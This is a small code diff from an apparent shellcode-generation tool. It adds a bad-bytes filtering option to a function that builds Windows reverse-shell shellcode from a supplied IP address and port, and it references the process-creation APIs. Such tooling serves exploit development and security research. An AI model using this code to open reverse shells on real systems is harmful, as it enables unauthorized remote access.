@@ -8,8 +8,8 @@ from shellcode.payload_utils import (
 from shellcode.shellcode_helper import ShellcodeHelper
 
 
-def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
-    var = ShellcodeHelper()
+def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0, bad_bytes=None):
+    var = ShellcodeHelper(bad_bytes=bad_bytes)
 
     f_term_process = "TerminateProcess"
     f_create_process = "CreateProcessA"
